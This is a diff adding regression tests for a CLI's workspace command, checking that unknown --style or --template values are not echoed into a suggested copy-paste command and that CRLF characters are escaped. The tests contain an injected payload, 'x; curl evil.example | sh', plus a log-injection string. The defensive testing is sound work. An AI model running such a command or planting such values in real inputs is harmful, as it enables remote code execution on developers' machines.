@@ -173,6 +173,29 @@ describe('a workspace root refuses --style', () => {
     expect(h.errText()).toContain('generate app');
     expect(h.errText()).toContain('--template rest --style class-based');
   });
+
+  // Audit F1: the value was echoed raw into a command the developer is told to
+  // copy, so a CI job building argv from untrusted data could put a shell
+  // payload in the suggestion. An unknown value is not echoed into it at all.
+  for (const flag of ['--style', '--template']) {
+    it(`never echoes an unknown ${flag} value into the suggested command`, async () => {
+      const h = harness();
+      expect(await h.run(['ws', '--workspace', flag, 'x; curl evil.example | sh'])).toBe(2);
+      // The suggested command is the backtick-quoted span; the payload must not
+      // be in it (quoting it back, escaped, in the prose is fine).
+      const command = h.errText().match(/`([^`]*)`/)?.[1] ?? '';
+      expect(command).toContain('generate app');
+      expect(command).not.toContain('curl');
+    });
+  }
+
+  it('renders control characters in an unknown value as escapes, keeping it one line', async () => {
+    const h = harness();
+    expect(await h.run(['ws', '--workspace', '--style', 'oop\r\nINJECTED: done'])).toBe(2);
+    expect(h.errText().includes('\r') || h.errText().includes(String.fromCharCode(27))).toBe(false);
+    expect(h.errText().split('\n').filter((line) => line.includes('INJECTED'))).toHaveLength(1);
+    expect(h.errText()).toContain('\\u000d\\u000a');
+  });
 });
 
 describe('the broker and queue overlays compose with the styled host (C5)', () => {
